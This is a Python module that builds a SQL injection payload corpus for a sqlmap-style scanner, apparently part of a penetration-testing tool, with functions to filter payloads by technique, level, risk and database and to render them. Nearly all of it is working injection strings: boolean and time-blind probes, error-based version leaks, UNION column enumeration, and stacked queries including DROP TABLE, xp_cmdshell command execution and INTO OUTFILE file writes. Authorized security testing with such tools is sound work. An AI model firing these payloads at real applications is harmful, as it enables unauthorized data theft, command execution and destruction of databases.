"""
SQLi payload corpus — sqlmap technique/level/risk/dbms model.

Techniques: B boolean-blind, E error-based, U union, S stacked, T time-blind, Q inline
"""

from __future__ import annotations

import random
from typing import Any

_DBMS_ALIASES = {
    "mysql": "mysql",
    "mariadb": "mysql",
    "postgres": "postgresql",
    "postgresql": "postgresql",
    "pgsql": "postgresql",
    "mssql": "microsoft sql server",
    "sqlserver": "microsoft sql server",
    "microsoft sql server": "microsoft sql server",
    "oracle": "oracle",
    "sqlite": "sqlite",
}


def _p(
    id_: str,
    technique: str,
    level: int,
    risk: int,
    title: str,
    vector: str,
    dbms: str = "",
    false_vector: str | None = None,
    time_sec: float = 0,
    clause: str = "WHERE",
) -> dict[str, Any]:
    d: dict[str, Any] = {
        "id": id_,
        "technique": technique,
        "level": level,
        "risk": risk,
        "dbms": dbms,
        "title": title,
        "vector": vector,
        "clause": clause,
    }
    if false_vector is not None:
        d["false_vector"] = false_vector
    if time_sec:
        d["time_sec"] = time_sec
    return d


def _build() -> list[dict[str, Any]]:
    p: list[dict[str, Any]] = []
    p += [
        _p("B-01", "B", 1, 1, "AND boolean string", "' AND '{T}'='{T}", false_vector="' AND '{T}'='{F}"),
        _p("B-02", "B", 1, 1, "AND boolean numeric", " AND {T}={T}", false_vector=" AND {T}={F}"),
        _p("B-03", "B", 1, 1, "AND boolean paren string", "') AND ('{T}'='{T}", false_vector="') AND ('{T}'='{F}"),
        _p("B-04", "B", 1, 1, "AND boolean double-quote", '" AND "{T}"="{T}', false_vector='" AND "{T}"="{F}'),
        _p("B-05", "B", 2, 1, "OR boolean string", "' OR '{T}'='{T}", false_vector="' OR '{T}'='{F}"),
        _p("B-06", "B", 2, 1, "OR boolean numeric", " OR {T}={T}", false_vector=" OR {T}={F}"),
        _p("B-07", "B", 2, 1, "AND boolean comment --", "' AND {T}={T}-- ", false_vector="' AND {T}={F}-- "),
        _p("B-08", "B", 2, 1, "AND boolean comment #", "' AND {T}={T}#", false_vector="' AND {T}={F}#", dbms="MySQL"),
        _p("B-09", "B", 2, 1, "AND boolean /*", "' AND {T}={T}/*", false_vector="' AND {T}={F}/*"),
        _p("B-10", "B", 3, 1, "AND RLIKE", "' AND {T} RLIKE '{T}", false_vector="' AND {T} RLIKE '{F}", dbms="MySQL"),
        _p("B-11", "B", 3, 1, "AND LIKE", "' AND '{T}' LIKE '{T}", false_vector="' AND '{T}' LIKE '{F}"),
        _p("B-12", "B", 3, 1, "AND null-safe <=>", "' AND {T}<=>{T}-- ", false_vector="' AND {T}<=>{F}-- ", dbms="MySQL"),
        _p("B-13", "B", 3, 1, "AND REGEXP", "' AND {T} REGEXP '{T}", false_vector="' AND {T} REGEXP '{F}", dbms="MySQL"),
        _p("B-14", "B", 2, 1, "AND integer subquery", " AND (SELECT [RANDNUM])=[RANDNUM]", false_vector=" AND (SELECT [RANDNUM])=[RANDNUM2]"),
        _p("B-15", "B", 3, 1, "XOR boolean", "' XOR {T}={T}-- ", false_vector="' XOR {T}={F}-- "),
        _p("B-16", "B", 4, 1, "AND BETWEEN", " AND {T} BETWEEN {T} AND {T}", false_vector=" AND {T} BETWEEN {F} AND {F}"),
        _p("B-17", "B", 4, 1, "AND JSON_CONTAINS", "' AND JSON_CONTAINS('[{T}]','{T}')-- ", false_vector="' AND JSON_CONTAINS('[{T}]','{F}')-- ", dbms="MySQL"),
        _p("B-18", "B", 5, 2, "HAVING boolean", "' HAVING {T}={T}-- ", false_vector="' HAVING {T}={F}-- ", clause="HAVING"),
        _p(
            "B-19",
            "B",
            5,
            2,
            "ORDER BY CASE boolean",
            "' ORDER BY (CASE WHEN ({T}={T}) THEN 1 ELSE 1*(SELECT 1 UNION SELECT 2) END)-- ",
            false_vector="' ORDER BY (CASE WHEN ({T}={F}) THEN 1 ELSE 1*(SELECT 1 UNION SELECT 2) END)-- ",
            clause="ORDER BY",
        ),
        _p("B-20", "B", 3, 1, "AND IS NOT NULL", "' AND {T} IS NOT NULL-- ", false_vector="' AND NULL IS NOT NULL-- "),
        _p("E-01", "E", 1, 1, "Generic single quote", "'"),
        _p("E-02", "E", 1, 1, "Generic double quote", '"'),
        _p("E-03", "E", 1, 1, "Generic paren quote", "')"),
        _p("E-04", "E", 1, 1, "Generic backtick", "`"),
        _p("E-05", "E", 1, 1, "Generic semicolon quote", "';'"),
        _p("E-06", "E", 1, 1, "MySQL extractvalue", "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- ", dbms="MySQL"),
        _p("E-07", "E", 1, 1, "MySQL updatexml", "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- ", dbms="MySQL"),
        _p("E-08", "E", 2, 1, "MySQL exp overflow", "' AND exp(~(SELECT * FROM (SELECT version())x))-- ", dbms="MySQL"),
        _p("E-09", "E", 2, 1, "MySQL GTID", "' AND gtid_subset(concat(0x7e,(SELECT version()),0x7e),null)-- ", dbms="MySQL"),
        _p(
            "E-10",
            "E",
            2,
            1,
            "MySQL floor error",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
            dbms="MySQL",
        ),
        _p("E-11", "E", 3, 1, "MySQL BIGINT", "' AND (SELECT 1*(CASE WHEN (1=1) THEN 1 ELSE 0xFFFFFFFFFFFFFFFF END))-- ", dbms="MySQL"),
        _p("E-12", "E", 1, 1, "MSSQL convert", "' AND 1=CONVERT(int,@@version)-- ", dbms="Microsoft SQL Server"),
        _p("E-13", "E", 1, 1, "MSSQL cast", " AND 1=CAST(@@version AS int)-- ", dbms="Microsoft SQL Server"),
        _p("E-14", "E", 2, 1, "MSSQL convert concat", "' AND 1=CONVERT(int,CHAR(126)+@@version+CHAR(126))-- ", dbms="Microsoft SQL Server"),
        _p("E-15", "E", 1, 1, "PostgreSQL cast", "' AND 1=CAST(version() AS int)-- ", dbms="PostgreSQL"),
        _p("E-16", "E", 2, 1, "PostgreSQL cast subquery", "' AND 1=CAST((SELECT version()) AS int)-- ", dbms="PostgreSQL"),
        _p("E-17", "E", 2, 1, "PostgreSQL CHR cast", " AND 1=CAST((CHR(126)||version()||CHR(126)) AS NUMERIC)-- ", dbms="PostgreSQL"),
        _p("E-18", "E", 1, 1, "Oracle CTXSYS", "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- ", dbms="Oracle"),
        _p("E-19", "E", 2, 1, "Oracle utl_inaddr", "' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))-- ", dbms="Oracle"),
        _p("E-20", "E", 1, 1, "SQLite json", "' AND json_extract(json('{\"a\":'||sqlite_version()||'}'),'$.a')-- ", dbms="SQLite"),
        _p("E-21", "E", 3, 2, "Generic div zero", "' AND 1/0-- "),
        _p("E-22", "E", 2, 1, "Generic backslash", "\\"),
    ]
    for n in range(1, 21):
        lvl = 1 if n <= 5 else 2 if n <= 10 else 3 if n <= 15 else 4
        nulls = ",".join(["NULL"] * n)
        p.append(_p(f"U-N{n}", "U", lvl, 1, f"UNION SELECT NULL x{n}", f"' UNION SELECT {nulls}-- "))
        if n <= 12:
            p.append(_p(f"U-NA{n}", "U", lvl, 1, f"UNION ALL NULL x{n}", f"' UNION ALL SELECT {nulls}-- "))
        if n <= 8:
            p.append(_p(f"U-NP{n}", "U", 2, 1, f"UNION paren NULL x{n}", f"') UNION SELECT {nulls}-- "))
            p.append(_p(f"U-NQ{n}", "U", 2, 1, f'UNION dquote NULL x{n}', f'" UNION SELECT {nulls}-- '))
    p += [
        _p("U-V1", "U", 2, 1, "UNION version MySQL", "' UNION SELECT 1,version(),3-- ", dbms="MySQL"),
        _p("U-V2", "U", 2, 1, "UNION version MSSQL", "' UNION SELECT 1,@@version,3-- ", dbms="Microsoft SQL Server"),
        _p("U-V3", "U", 2, 1, "UNION version PG", "' UNION SELECT 1,version(),3-- ", dbms="PostgreSQL"),
        _p("U-V4", "U", 2, 1, "UNION user MySQL", "' UNION SELECT 1,user(),3-- ", dbms="MySQL"),
        _p("U-V5", "U", 2, 1, "UNION database MySQL", "' UNION SELECT 1,database(),3-- ", dbms="MySQL"),
        _p("U-V6", "U", 2, 1, "UNION sqlite_version", "' UNION SELECT 1,sqlite_version(),3-- ", dbms="SQLite"),
        _p("U-V7", "U", 3, 1, "UNION schema MySQL", "' UNION SELECT 1,schema(),3-- ", dbms="MySQL"),
    ]
    for n in (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 20, 25, 30, 40, 50):
        lvl = 1 if n <= 5 else 2 if n <= 10 else 3 if n <= 20 else 4 if n <= 30 else 5
        p.append(_p(f"U-ORD{n}", "U", lvl, 1, f"ORDER BY {n}", f"' ORDER BY {n}-- ", clause="ORDER BY"))
        p.append(_p(f"U-ORD{n}n", "U", lvl, 1, f"ORDER BY {n} numeric", f" ORDER BY {n}-- ", clause="ORDER BY"))
    p += [
        _p("T-01", "T", 1, 2, "MySQL SLEEP", "' AND SLEEP({SLEEP})-- ", dbms="MySQL", time_sec=3),
        _p("T-02", "T", 1, 2, "MySQL SLEEP paren", "') AND SLEEP({SLEEP})-- ", dbms="MySQL", time_sec=3),
        _p(
            "T-03",
            "T",
            1,
            2,
            "MySQL IF SLEEP",
            "' AND IF({T}={T},SLEEP({SLEEP}),0)-- ",
            dbms="MySQL",
            time_sec=3,
            false_vector="' AND IF({T}={F},SLEEP({SLEEP}),0)-- ",
        ),
        _p("T-04", "T", 2, 2, "MySQL BENCHMARK", "' AND BENCHMARK(5000000,SHA1('{T}'))-- ", dbms="MySQL", time_sec=2),
        _p("T-05", "T", 2, 2, "MySQL GET_LOCK", "' AND IF({T}={T},GET_LOCK('psec',{SLEEP}),0)-- ", dbms="MySQL", time_sec=3),
        _p("T-06", "T", 3, 2, "MySQL RLIKE SLEEP", "' RLIKE SLEEP({SLEEP})-- ", dbms="MySQL", time_sec=3),
        _p("T-07", "T", 3, 2, "MySQL ELT SLEEP", "' AND ELT({T}={T},SLEEP({SLEEP}))-- ", dbms="MySQL", time_sec=3),
        _p("T-08", "T", 1, 2, "MSSQL WAITFOR", "'; WAITFOR DELAY '0:0:{SLEEP}'-- ", dbms="Microsoft SQL Server", time_sec=3),
        _p(
            "T-09",
            "T",
            1,
            2,
            "MSSQL IF WAITFOR",
            "'; IF {T}={T} WAITFOR DELAY '0:0:{SLEEP}'-- ",
            dbms="Microsoft SQL Server",
            time_sec=3,
            false_vector="'; IF {T}={F} WAITFOR DELAY '0:0:{SLEEP}'-- ",
        ),
        _p(
            "T-10",
            "T",
            1,
            2,
            "PostgreSQL pg_sleep",
            "'; SELECT CASE WHEN ({T}={T}) THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END-- ",
            dbms="PostgreSQL",
            time_sec=3,
            false_vector="'; SELECT CASE WHEN ({T}={F}) THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END-- ",
        ),
        _p(
            "T-11",
            "T",
            2,
            2,
            "PostgreSQL AND pg_sleep",
            "' AND {T}=(SELECT CASE WHEN ({T}={T}) THEN (SELECT {T} FROM pg_sleep({SLEEP})) ELSE {T} END)-- ",
            dbms="PostgreSQL",
            time_sec=3,
        ),
        _p("T-12", "T", 2, 2, "Oracle DBMS_PIPE", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{SLEEP})-- ", dbms="Oracle", time_sec=3),
        _p(
            "T-13",
            "T",
            3,
            2,
            "Oracle heavy cartesian",
            "' AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4)-- ",
            dbms="Oracle",
            time_sec=2,
        ),
        _p(
            "T-14",
            "T",
            2,
            2,
            "SQLite RANDOMBLOB heavy",
            "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- ",
            dbms="SQLite",
            time_sec=3,
        ),
        _p("S-01", "S", 2, 2, "Stacked SELECT", ";SELECT 1-- "),
        _p("S-02", "S", 3, 3, "Stacked WAITFOR", ";WAITFOR DELAY '0:0:{SLEEP}'-- ", dbms="Microsoft SQL Server", time_sec=3),
        _p("S-03", "S", 3, 3, "Stacked SLEEP", ";SELECT SLEEP({SLEEP})-- ", dbms="MySQL", time_sec=3),
        _p("S-04", "S", 3, 3, "Stacked pg_sleep", ";SELECT pg_sleep({SLEEP})-- ", dbms="PostgreSQL", time_sec=3),
        _p("S-05", "S", 4, 3, "Stacked CREATE TABLE", ";CREATE TABLE IF NOT EXISTS psec_test(id INT)-- "),
        _p("S-06", "S", 4, 3, "Stacked DROP TABLE", ";DROP TABLE IF EXISTS psec_test-- "),
        _p("S-07", "S", 5, 3, "Stacked xp_cmdshell echo", ";EXEC master..xp_cmdshell 'echo psec'-- ", dbms="Microsoft SQL Server"),
        _p("S-08", "S", 3, 2, "Stacked INSERT", ";INSERT INTO psec_test(id) VALUES(1)-- "),
        _p("S-09", "S", 4, 3, "Stacked INTO OUTFILE", ";SELECT 'psec' INTO OUTFILE '/tmp/psec.txt'-- ", dbms="MySQL"),
        _p("Q-01", "Q", 2, 1, "Inline comment OR", "'/**/OR/**/1=1-- "),
        _p("Q-02", "Q", 2, 1, "MySQL versioned OR", "'/*!50000OR*/1=1-- ", dbms="MySQL"),
        _p("Q-03", "Q", 3, 1, "Inline subquery", "' AND (SELECT 1)=1-- "),
        _p("Q-04", "Q", 3, 1, "Inline CAST", "' AND CAST(1 AS CHAR)='1'-- "),
        _p("Q-05", "Q", 4, 1, "0x hex compare", " AND 0x31=0x31", false_vector=" AND 0x31=0x32", dbms="MySQL"),
        _p("Q-06", "Q", 4, 1, "CHAR compare", "' AND CHAR(49)=CHAR(49)-- ", false_vector="' AND CHAR(49)=CHAR(50)-- "),
        _p("Q-07", "Q", 3, 1, "Inline WHERE bypass", "1 OR 1=1"),
        _p("Q-08", "Q", 4, 2, "Inline scientific", "1e0 OR 1e0=1e0"),
    ]
    return p


PAYLOADS: list[dict[str, Any]] = _build()


def render_vector(vector: str, sleep: int = 3, true_val: str = "1", false_val: str = "0") -> str:
    r1 = random.randint(1000, 9999)
    r2 = random.randint(10000, 99999)
    return (
        vector.replace("{SLEEP}", str(sleep))
        .replace("{T}", true_val)
        .replace("{F}", false_val)
        .replace("[RANDNUM]", str(r1))
        .replace("[RANDNUM2]", str(r2))
    )


def _dbms_match(wanted: str, payload_dbms: str) -> bool:
    if not payload_dbms:
        return True
    if not wanted:
        return True
    w = _DBMS_ALIASES.get(wanted.lower(), wanted.lower())
    return w in payload_dbms.lower()


def list_payloads(
    technique: str = "BEUSTQ",
    level: int = 3,
    risk: int = 2,
    dbms: str = "",
) -> dict[str, Any]:
    tech = set((technique or "BEUSTQ").upper())
    level = max(1, min(int(level), 5))
    risk = max(1, min(int(risk), 3))
    out = []
    for item in PAYLOADS:
        if item["technique"] not in tech:
            continue
        if item["level"] > level or item["risk"] > risk:
            continue
        if not _dbms_match(dbms, item["dbms"]):
            continue
        out.append(dict(item))
    return {
        "count": len(out),
        "technique": "".join(sorted(tech)),
        "level": level,
        "risk": risk,
        "dbms": dbms or "any",
        "payloads": out,
        "corpus_total": len(PAYLOADS),
    }
